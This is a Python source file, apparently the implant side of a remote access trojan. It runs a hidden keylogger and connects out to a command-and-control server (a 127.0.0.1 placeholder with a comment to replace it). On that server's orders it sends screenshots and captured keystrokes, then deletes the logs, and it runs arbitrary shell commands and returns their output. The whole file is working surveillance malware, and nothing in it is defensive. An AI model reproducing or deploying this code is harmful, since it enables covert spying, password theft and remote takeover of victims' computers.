from PIL import ImageGrab
import socket
import os
import threading
import subprocess
from pynput import keyboard

def take_screenshot():
    img = ImageGrab.grab()
    img.save("screenshot.png")

def connect_to_server(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    return client_socket

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            with open("keylogs.txt", "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open("keylogs.txt", "a") as f:
                f.write("\n")

def main():
    host = '127.0.0.1'  # Replace with the IP address of your C2 server
    port = 1112         # Use the same port number as the C2 server

    # Create keylogs.txt if it doesn't exist
    if not os.path.exists("keylogs.txt"):
        with open("keylogs.txt", "w") as f:
            pass

    client_socket = connect_to_server(host, port)
    print(f"Connected to the server: {host}:{port}")

    # Start keylogger thread
    keylogger_thread = threading.Thread(target=keyboard.Listener(on_press=on_press).start)
    keylogger_thread.daemon = True  # Set the thread as daemon to run in the background
    keylogger_thread.start()

    try:
        while True:
            command = client_socket.recv(1024).decode().strip()

            if not command:
                continue

            print(f"Received command: {command}")

            if command == "screenshot":
                print("Taking screenshot...")
                take_screenshot()
                print("Sending screenshot data...")
                with open("screenshot.png", "rb") as f:
                    screenshot_data = f.read()
                    size = len(screenshot_data)
                    client_socket.sendall(bytes(str(size), 'utf-8'))
                    client_socket.sendall(screenshot_data)
                print("Screenshot data sent successfully.")
                os.remove("screenshot.png")  # Delete the screenshot after sending
            elif command == "cmd":
                cmd_command = client_socket.recv(1024).decode().strip()
                try:
                    output = subprocess.check_output(cmd_command, shell=True).decode('utf-8')
                    client_socket.sendall(bytes(output, 'utf-8'))
                except Exception as e:
                    client_socket.sendall(bytes(str(e), 'utf-8'))
            elif command == "logs":
                print("Sending key logs...")
                with open("keylogs.txt", "rb") as f:
                    logs_data = f.read()
                    size = len(logs_data)
                    client_socket.sendall(bytes(str(size), 'utf-8'))
                    client_socket.sendall(logs_data)
                print("Key logs sent successfully.")
                # Optional: Delete the keylogs file after sending
                os.remove("keylogs.txt")

            elif command == "exit":
                break
            else:
                print("Invalid command.")

    except Exception as e:
        print(f"Error occurred - {e}")

    print("Connection closed.")
    client_socket.close()

if __name__ == "__main__":
    main()
